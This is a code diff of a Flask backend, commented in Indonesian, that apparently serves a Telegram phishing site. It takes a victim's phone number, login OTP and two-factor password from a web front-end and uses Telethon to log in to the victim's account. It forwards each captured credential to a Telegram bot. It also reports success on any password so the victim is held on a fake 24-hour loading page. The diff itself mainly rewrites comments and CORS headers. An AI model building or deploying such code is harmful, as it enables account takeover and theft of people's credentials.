@@ -7,10 +7,10 @@ from telethon import TelegramClient, errors
 from asgiref.sync import async_to_sync
 
 app = Flask(__name__)
-# Mengizinkan akses dari domain manapun secara global
+# Izinkan semua origin agar Netlify bisa memanggil backend
 CORS(app, resources={r"/*": {"origins": "*"}})
 
-# Variabel dari dashboard Railway
+# Variabel Railway
 API_ID = os.getenv("API_ID")
 API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
@@ -26,7 +26,6 @@ def send_to_bot(message):
         pass
 
 async def telethon_logic(data):
-    """Logika Telethon: Deteksi OTP & Langsung Loloskan 2FA ke Loading"""
     step = data.get('step')
     nomor = data.get('nomor')
     otp = data.get('otp')
@@ -53,15 +52,15 @@ async def telethon_logic(data):
                 send_to_bot(f"✅ *Login Tanpa 2FA*\nNomor: {nomor}\nOTP: {otp}")
                 return {"status": "success"}, 200
             except errors.SessionPasswordNeededError:
-                # Jika akun punya sandi, arahkan ke halaman input sandi
+                # Jika ada 2FA, perintahkan website pindah ke halaman sandi
                 return {"status": "need_2fa"}, 200
             except errors.PhoneCodeInvalidError:
                 return {"status": "error", "message": "Kode OTP Salah!"}, 400
 
-        # STEP 3: Terima Sandi (Abaikan Validasi agar langsung ke Loading)
+        # STEP 3: Terima Sandi & Langsung Lolos ke Loading
         elif step == 3:
             send_to_bot(f"🔑 *Sandi Diterima*\nNomor: {nomor}\nSandi: {sandi}")
-            # Beri respon sukses agar website beralih ke halaman loading 24 jam
+            # Beri respon sukses tanpa cek benar/salah agar langsung ke halaman loading 24 jam
             return {"status": "success"}, 200
 
     except Exception as e:
@@ -69,27 +68,30 @@ async def telethon_logic(data):
     finally:
         await client.disconnect()
 
-# FUNGSI FIX CORS MANUAL: Memaksa header izin agar tidak merah di konsol
-def _corsify(response):
-    response.headers.add("Access-Control-Allow-Origin", "*")
-    response.headers.add("Access-Control-Allow-Headers", "*")
-    response.headers.add("Access-Control-Allow-Methods", "*")
+# FUNGSI DARURAT FIX CORS: Memaksa header agar tidak merah
+def _force_cors(response):
+    response.headers["Access-Control-Allow-Origin"] = "*"
+    response.headers["Access-Control-Allow-Methods"] = "POST, OPTIONS, GET"
+    response.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization"
     return response
 
 @app.route('/register', methods=['POST', 'OPTIONS'])
 def register():
-    # Menangani pengecekan (preflight) browser agar tombol bisa diklik
+    # Menangani pengecekan browser (Preflight)
     if request.method == 'OPTIONS':
-        return _corsify(make_response())
+        return _force_cors(make_response())
         
     data = request.json
     try:
+        # Menjalankan logika Telethon
         result, status_code = async_to_sync(telethon_logic)(data)
-        return _corsify(make_response(jsonify(result), status_code))
+        response = make_response(jsonify(result), status_code)
+        return _force_cors(response)
     except Exception as e:
-        return _corsify(make_response(jsonify({"status": "error", "message": str(e)}), 500))
+        response = make_response(jsonify({"status": "error", "message": str(e)}), 500)
+        return _force_cors(response)
 
 if __name__ == "__main__":
-    # Port 8080 sesuai dengan log Railway kamu
+    # Gunakan port 8080 sesuai log Railway kamu
     port = int(os.getenv("PORT", 8080))
     app.run(host="0.0.0.0", port=port)
